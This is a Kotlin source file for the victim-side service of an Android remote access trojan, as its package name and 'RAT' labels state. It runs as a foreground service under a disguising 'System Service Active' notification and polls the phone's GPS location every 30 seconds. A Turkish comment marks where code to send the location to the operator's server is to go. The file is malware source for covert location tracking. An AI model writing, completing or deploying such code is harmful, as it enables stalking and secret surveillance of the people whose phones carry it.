package com.yourname.rat.victim.services

import android.app.*
import android.content.Intent
import android.location.Location
import android.location.LocationManager
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import kotlinx.coroutines.*
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class CoreService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO)
    private val CHANNEL_ID = "RAT_CHANNEL"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, getNotification())
        
        // GPS ve Loglama döngüsü
        scope.launch {
            while (isActive) {
                collectLocation()
                delay(30_000) // 30 saniyede bir
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "RAT Service", NotificationManager.IMPORTANCE_LOW)
            val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun getNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setContentTitle("System Service Active")
            .setContentText("Monitoring...")
            .build()
    }

    private suspend fun collectLocation() {
        val locationManager = getSystemService(LOCATION_SERVICE) as LocationManager
        try {
            val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            if (location != null) {
                // Buraya sunucuya gönderme kodu gelecek
                android.util.Log.d("RAT_LOG", "Location: ${location.latitude}, ${location.longitude}")
            }
        } catch (e: SecurityException) {
            android.util.Log.e("RAT_LOG", "Location permission denied: ${e.message}")
        }
    }

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}